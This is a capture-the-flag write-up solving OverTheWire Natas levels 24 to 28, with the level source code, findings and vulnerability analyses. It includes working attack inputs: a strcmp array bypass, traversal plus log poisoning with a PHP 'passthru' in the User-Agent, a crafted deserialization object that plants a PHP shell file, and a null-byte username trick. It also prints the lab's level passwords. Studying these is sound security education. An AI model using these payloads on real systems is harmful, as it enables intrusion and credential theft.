<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
from the code, we know that the webpage is using get method to collect user input. thus, we can do exploitation by modifyng the url. 
besides, we need to make the condition that !strcmp($_REQUEST["passwd"],"<censored>" = TRUE
then, the condition become !0, then execute the password. 
however, we have no idea about what is the password. doing brute force also time consuming. 
thus, we can use another way. use to do comparison betweeen the array and the string and let it return as null. thus, the condition become !NULL. then execute the password. 

### Approach 
just change thee url become `http://natas24.natas.labs.overthewire.org/?passwd[]=1`

```
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23

The credentials for the next level are:

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```


### Analysis
This vulnerability is caused by PHP’s weak comparison behavior combined with improper input type handling in the strcmp() function. The application expects $_REQUEST["passwd"] to be a string and compares it against a hidden password using strcmp(). In PHP, strcmp() is intended to return 0 when both strings are equal, and the code negates this result using !strcmp(...) to check for equality. However, the function does not properly validate the input type. When an array is passed instead of a string (for example, passwd[]=1), strcmp() throws a warning and returns NULL instead of a valid integer comparison result. In PHP, NULL is treated as 0 in a boolean context, and applying the logical NOT operator (!) converts it into TRUE. As a result, the condition !strcmp(...) evaluates to true even though no valid password comparison has occurred. This allows an attacker to bypass authentication entirely by manipulating the input type rather than guessing the actual password value. This demonstrates a classic type confusion vulnerability where improper input validation leads to unintended authentication bypass.

<br><br><br><br><br>







## Natas 25
```
URL: http://natas25.natas.labs.overthewire.org
Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```
After login, the following content is displayed:
```
Quote

You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
Scientist, Bad Boy Bubby
```

along with the language dropdown to let us select the language and view sourcecode link for use to view the source code. 

Below is the contnet of the source code: 
```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Approach 
Seems the ../ will treated as "". Therefore, to keep the `../` we just insert something so that after `../` changed to "", the output still remained as `../`
for example, we can use either ..`../`/ or .`../`./

next, because the condition mentioned the natas_webpass will directly exit(1), therefore, we only can use /var/www/natas/natas25/logs/natas25_" . session_id() .".log"

we navigate to `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_70m2ai7p9ids0dspii4c57f7j8.log`

the browser output content: 
```
[19.04.2026 06::43:04] Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 "Directory traversal attempt! fixing request."
```

from the browser, is identify that we can modify the user agent to perform some php operation. 
therefore, we change the useragent using burpsuite
User-Agent: <?php passthru("cat /etc/natas_webpass/natas26"); ?>

in burpsuite, the request content modification therefore, our request become `lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_70m2ai7p9ids0dspii4c57f7j8.log`

#### Complete Modified Request Content: 
```
GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_70m2ai7p9ids0dspii4c57f7j8.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php passthru("cat /etc/natas_webpass/natas26"); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=70m2ai7p9ids0dspii4c57f7j8
Upgrade-Insecure-Requests: 1
```

from the browser, we obtained the following output: 
```
[19.04.2026 06::54:00] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." 
```

then, the password for next challenge is identified. 

### Finding 
From the source code, the application dynamically includes language files based on the lang parameter using the safeinclude() function. The filename is constructed directly from user input and then passed into several validation checks. First, the function attempts to prevent directory traversal by detecting "../" and removing it using str_replace(). However, this sanitization is flawed because it only removes a single occurrence and does not account for nested or obfuscated traversal patterns such as ....//, which can be normalized back into valid directory traversal sequences after filtering. Additionally, the function blocks access to any file path containing the string "natas_webpass" and terminates execution using exit(-1). Despite these protections, the file is still included using include($filename) if it exists. Another key observation is that the application logs certain requests using the User-Agent header and writes them into a file located at /var/www/natas/natas25/logs/natas25_<session_id>.log. Since this log file path can be influenced via directory traversal in the lang parameter, it becomes a potential target for file inclusion.

### Analysis
This vulnerability is caused by a combination of weak input sanitization and unsafe file inclusion logic. The directory traversal protection is ineffective because it relies on simple string replacement of "../", which can be bypassed using obfuscated traversal patterns such as ....//....//. These patterns are transformed during sanitization in a way that still allows the traversal to reconstruct valid relative paths. Additionally, the application introduces a second vulnerability through insecure logging of user-controlled input, specifically the User-Agent header, which is written directly into a log file without proper sanitization. By combining these two weaknesses, an attacker can achieve log file poisoning by injecting PHP code into the log via the User-Agent header, and then trigger remote code execution by including the poisoned log file through directory traversal in the lang parameter. This results in arbitrary code execution within the context of the web server. The issue demonstrates a classic combination of directory traversal and log injection leading to log poisoning exploitation.

<br><br><br><br><br>







## Natas 26
```
URL: http://natas26.natas.labs.overthewire.org
Username: natas26
Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```
After login, the webpaage displaying a message draw a line and request the input for X1, Y1, X2, Y2 along with draw button. 

below is the content of the source code: 
```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
<body>
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
after input the value, the new parameter exist in the cookie, which is drawing with value of `YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMiI7czoyOiJ4MiI7czoxOiIzIjtzOjI6InkyIjtzOjE6IjQiO319`. believe this is the output generated after serialization and encoded with base64. 


### Approach 
to exploit teh vulnerability, we can modify this drawing parameter. 

modifiied output is generated from the code below: 
```
<?php

class Logger{
    private $logFile;
    private $initMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="<?php passthru(`cat /etc/natas_webpass/natas27`); ?>";
        $this->logFile = "img/test.php";
    }
}

$hack = new Logger();
print base64_encode(serialize($hack));

?>
```

the modified output obtained is `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTI6Ijw/cGhwIHBhc3N0aHJ1KGBjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjdgKTsgPz4iO30=`

after changing the value, we got this error: 
`Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105`

then, navigate to `http://natas26.natas.labs.overthewire.org/img/test.php`. the password is obtained. 


### Analysis
This vulnerability is caused by insecure object deserialization combined with unsafe use of PHP’s magic methods. The application stores drawing data in a cookie called drawing, which is base64-decoded and then passed directly into unserialize(). Because the input is fully controlled by the user, an attacker can manipulate the serialized object structure and inject a custom Logger object. The Logger class contains a __destruct() method that writes data to a file path defined by $logFile. Since object properties are not properly validated or restricted, an attacker can override internal class values such as the log file path and message content. By crafting a malicious serialized object, it is possible to set the log file to a web-accessible location (for example inside /img/) and inject PHP code into the log message.

When the object is later destroyed at the end of script execution, the __destruct() method automatically executes and writes the attacker-controlled content into the specified file. This results in a file containing executable PHP code being placed in a publicly accessible directory. The attacker can then access this file directly via the web server, leading to remote code execution. This level demonstrates a classic insecure deserialization vulnerability, where trusting serialized user input allows full control over object state and enables exploitation through PHP magic methods such as __destruct().

<br><br><br><br><br>







## Natas 27
```
URL: http://natas27.natas.labs.overthewire.org
Username: natas27
Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
```
After login, the webpage request for username and password input along with a login button. 

Below is the source code: 
```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
for several attempt, we can conlcude that
if the user is not exisit, this webpage is served as registration system to add username and password into the table. 
else if user exist, if the password is correct, then login. else return wrong password. 

cannot use the payload like " OR 1=1# cause the special character will treated as string also. 

cannot create username like `natas28       ` cause will return go away hacker.

based on the code, we can identify that the dumpData function only check for the username within the table without verifying the password. $query = "SELECT * from users where username='$user'";


### Approach 
to get the password for the natas28, we can insert the null character to make the username the same, becuase the null character will be trimmed. therefore, we just need to login using our own password created, and the retrieved will be the real user of natas28. 

`natas28(null x64)a` as our username and use `a` as password. 

use %00 as null as url encoding. and attempt to do this using burpsuite. 

Modified request content: 
```
POST /index.php HTTP/1.1
Host: natas27.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://natas27.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
Connection: keep-alive
Referer: http://natas27.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00a&password=a
```

Response content: 
```
HTTP/1.1 200 OK
Date: Sun, 19 Apr 2026 12:45:08 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 982
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28
```

page source of response: 
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28 (...64 null characters...) a was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

after that, we try to relogin again using username=natas28&password=a 
```
POST /index.php HTTP/1.1
Host: natas27.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://natas27.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
Connection: keep-alive
Referer: http://natas27.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

username=natas28&password=a
```

response content: 
```
HTTP/1.1 200 OK
Date: Sun, 19 Apr 2026 12:51:08 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1027
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
Welcome natas28!<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Analysis
This vulnerability is caused by improper handling of string truncation and inconsistent normalization between user input and database storage. The application attempts to prevent abuse by rejecting usernames with trailing whitespace using trim($usr), and also limits input length using substr($usr, 0, 64) before inserting into the database. However, these checks are applied inconsistently across different functions such as createUser(), validUser(), and dumpData(). As a result, it becomes possible to create two logically different usernames that are treated as distinct during insertion but become identical after trimming or truncation in later operations.

The key issue arises from MySQL’s handling of string comparison and padding behavior for VARCHAR(64). By carefully crafting a username that includes the target account name (natas28) followed by null bytes and additional padding, an attacker can bypass the duplicate user check and create a new entry that is visually and logically equivalent after normalization. This allows the attacker to insert a malicious or alternate account that conflicts with an existing privileged user. When the system later retrieves user data using inconsistent sanitization rules, it can return data associated with the attacker-controlled entry or the real target user, effectively leaking sensitive credentials. This demonstrates a classical case of string truncation and normalization mismatch between application-level logic and database-level storage, leading to an authentication bypass and privilege escalation.

<br><br><br><br><br>







## Natas 28
```
URL: http://natas28.natas.labs.overthewire.org
Username: natas28
Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
```
After login, the webpage display `Whack Computer Joke Database` header and `sorry, we are currently out of sauce` footer and request for search input and a search button. Below is the source code of this page: 
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
<body>
<!--
    morla/10111
    y0 n0th!
-->
<h1>natas28</h1>
<div id="content">

<form action="index.php" method="POST">
    <h2> Whack Computer Joke Database</h2>
    Search: <input name="query"><br>
    <input type="submit" value="search" />
</form>


<div id="viewsource">sorry, we are currently out of sauce</div>
</div>
</body>
</html>
```

### Finding 
attempt to input `a` and the query is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D`
attempt to input `aa` and the query is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D`
attempt to input `aaa` and the query is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D`

attempt to decode the query using url decode and base64 decode, however, the return output is "alien" language. Therefore, we can conclude that the query has been encrypted using some method. 
to make it more human readable, we need to find the pattern of the query. 

below is the query format after attempt for `a` until 50x`a`
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPI1BKmpZ1%2F9YUtPH5DShPyqKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4%2FLsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJKEf%2FnOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKf3hzvbj%2BEoXJjPzB0%2FI4YZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D

G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%
